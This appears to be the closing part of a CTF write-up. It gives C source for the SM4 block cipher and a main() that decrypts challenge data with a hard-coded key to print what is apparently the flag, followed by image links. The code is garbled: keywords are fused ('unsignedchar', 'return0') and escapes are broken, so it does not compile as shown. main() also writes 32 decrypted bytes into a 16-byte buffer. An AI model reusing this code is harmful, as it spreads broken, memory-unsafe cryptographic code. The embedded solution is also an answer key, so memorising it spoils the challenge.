static unsigned char sm4Sbox(unsigned char inch)
{
    unsignedchar *pTable = (unsignedchar *)SboxTable;
    unsignedchar retVal = (unsignedchar)(pTable[inch]);
    return retVal;
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * private F(Lt) function:
 * "T algorithm" == "L algorithm" + "t algorithm".
 * args:    [in] a: a is a 32 bits unsigned value;
 * return: c: c is calculated with line algorithm "L" and nonline algorithm "t"
 */
static unsigned long sm4Lt(unsigned long ka)
{
    unsignedlong bb = 0;
    unsignedlong c = 0;
    unsignedchar a[4];
    unsignedchar b[4];
    PUT_ULONG_BE(ka, a, 0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb, b, 0)
    c = bb ^ (ROTL(bb, 2)) ^ (ROTL(bb, 10)) ^ (ROTL(bb, 18)) ^ (ROTL(bb, 24));
    return c;
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * private F function:
 * Calculating and getting encryption/decryption contents.
 * args:    [in] x0: original contents;
 * args:    [in] x1: original contents;
 * args:    [in] x2: original contents;
 * args:    [in] x3: original contents;
 * args:    [in] rk: encryption/decryption key;
 * return the contents of encryption/decryption contents.
 */
static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)
{
    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk));
}
/*--------------------------------------------------------------------------------------------------------------*/
/* private function:
 * Calculating round encryption key.
 * args:    [in] a: a is a 32 bits unsigned value;
 * return: sk[i]: i{0,1,2,3,...31}.
 */
static unsigned long sm4CalciRK(unsigned long ka)
{
    unsignedlong bb = 0;
    unsignedlong rk = 0;
    unsignedchar a[4];
    unsignedchar b[4];
    PUT_ULONG_BE(ka, a, 0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb, b, 0)
    rk = bb ^ (ROTL(bb, 13)) ^ (ROTL(bb, 23));
    return rk;
}
/*--------------------------------------------------------------------------------------------------------------*/
static void sm4_setkey(unsigned long SK[32], unsigned char key[16])
{
    unsignedlong MK[4];
    unsignedlong k[36];
    unsignedlong i = 0;

    GET_ULONG_BE(MK[0], key, 0);
    GET_ULONG_BE(MK[1], key, 4);
    GET_ULONG_BE(MK[2], key, 8);
    GET_ULONG_BE(MK[3], key, 12);
    k[0] = MK[0] ^ FK[0];
    k[1] = MK[1] ^ FK[1];
    k[2] = MK[2] ^ FK[2];
    k[3] = MK[3] ^ FK[3];
    for (; i < 32; i++)
    {
        k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]));
        SK[i] = k[i + 4];
    }
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * SM4 standard one round processing
 *
 */
static void sm4_one_round(unsigned long sk[32],
                          unsigned char input[16],
                          unsigned char output[16])
{
    unsignedlong i = 0;
    unsignedlong ulbuf[36];

    memset(ulbuf, 0, sizeof(ulbuf));
    GET_ULONG_BE(ulbuf[0], input, 0)
    GET_ULONG_BE(ulbuf[1], input, 4)
    GET_ULONG_BE(ulbuf[2], input, 8)
    GET_ULONG_BE(ulbuf[3], input, 12)
    while (i < 32)
    {
        ulbuf[i + 4] = sm4F(ulbuf[i], ulbuf[i + 1], ulbuf[i + 2], ulbuf[i + 3], sk[i]);
        i++;
    }
    PUT_ULONG_BE(ulbuf[35], output, 0);
    PUT_ULONG_BE(ulbuf[34], output, 4);
    PUT_ULONG_BE(ulbuf[33], output, 8);
    PUT_ULONG_BE(ulbuf[32], output, 12);
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * SM4 key schedule (128-bit, encryption)
 */
void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16])
{
    ctx->mode = SM4_ENCRYPT;
    sm4_setkey(ctx->sk, key);
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * SM4 key schedule (128-bit, decryption)
 */
void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16])
{
    int i;
    ctx->mode = SM4_ENCRYPT;
    sm4_setkey(ctx->sk, key);
    for (i = 0; i < 16; i++)
    {
        SWAP(ctx->sk[i], ctx->sk[31 - i]);
    }
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * SM4-ECB block encryption/decryption
 */
void sm4_crypt_ecb(sm4_context *ctx,
                   int mode,
                   int length,
                   unsigned char *input,
                   unsigned char *output)
{
    while (length > 0)
    {
        sm4_one_round(ctx->sk, input, output);
        input += 16;
        output += 16;
        length -= 16;
    }
}
/*--------------------------------------------------------------------------------------------------------------*/
/*
 * SM4-CBC buffer encryption/decryption
 */
void sm4_crypt_cbc(sm4_context *ctx,
                   int mode,
                   int length,
                   unsigned char iv[16],
                   unsigned char *input,
                   unsigned char *output)
{
    int i;
    unsignedchar temp[16];

    if (mode == SM4_ENCRYPT)
    {
        while (length > 0)
        {
            for (i = 0; i < 16; i++)
                output[i] = (unsignedchar)(input[i] ^ iv[i]);

            sm4_one_round(ctx->sk, output, output);
            memcpy(iv, output, 16);

            input += 16;
            output += 16;
            length -= 16;
        }
    }
    else/* SM4_DECRYPT */
    {
        while (length > 0)
        {
            memcpy(temp, input, 16);
            sm4_one_round(ctx->sk, input, output);

            for (i = 0; i < 16; i++)
                output[i] = (unsignedchar)(output[i] ^ iv[i]);

            memcpy(iv, temp, 16);

            input += 16;
            output += 16;
            length -= 16;
        }
    }
}
/*--------------------------------------------------------------------------------------------------------------*/
int main()
{
    unsignedchar key[16] = {0x4E, 0x43, 0x54, 0x46, 0x32, 0x34, 0x6E, 0x63, 0x74, 0x66,
                             0x4E, 0x43, 0x54, 0x46, 0x32, 0x34};
    unsignedchar input[32] = {
        0xFB, 0x97, 0x3C, 0x3B, 0xF1, 0x99, 0x12, 0xDF, 
        0x13, 0x30, 0xF7, 0xD8, 0x7F, 0xEB, 0xA0, 0x6C, 
        0x14, 0x5B, 0xA6, 0x2A, 0xA8, 0x05, 0xA5, 0xF3, 
        0x76, 0xBE, 0xC9, 0x01, 0xF9, 0x36, 0x7B, 0x46
    };
    unsignedchar output[16];
    sm4_context ctx;
    unsignedlong i;

    /*
    //encrypt testing
    sm4_setkey_enc(&ctx,key);
    sm4_crypt_ecb(&ctx,1,16,input,output);
    for(i=0;i<16;i++)
        printf("%02x ", output[i]);
    printf("n");
    */

    // decrypt testing
    sm4_setkey_dec(&ctx, key);
    sm4_crypt_ecb(&ctx, 0, 32, input, output);
    for (i = 0; i < 32; i++)
        printf("%c", output[i]);
    printf("n");
    return0;
}
//58cb925e0cd823c0d0b54fd06b820b7e
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-e36f652289f6b6fe4127c37b0cd3a0eb.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-d9caf5eea47132a249a02f720f9f80c7.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-47d6143f71c98608718e44e600bbd996.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-490b13e6852fa59d0ecac30b1444290c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-cc4a5fd07363c34f323450f7f21b3a02.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-7fc2601d04c1dcb9dabc81a1cf89b3e6.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-67e66fe48dac012a82b80470aac445e8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-a9e5fa7556e9fd756db94d2e4cd3a120.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-1356d897148ed97289dda484084b9e99.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-abd9daf0f5ce3f0f6e75df678523aac4.png)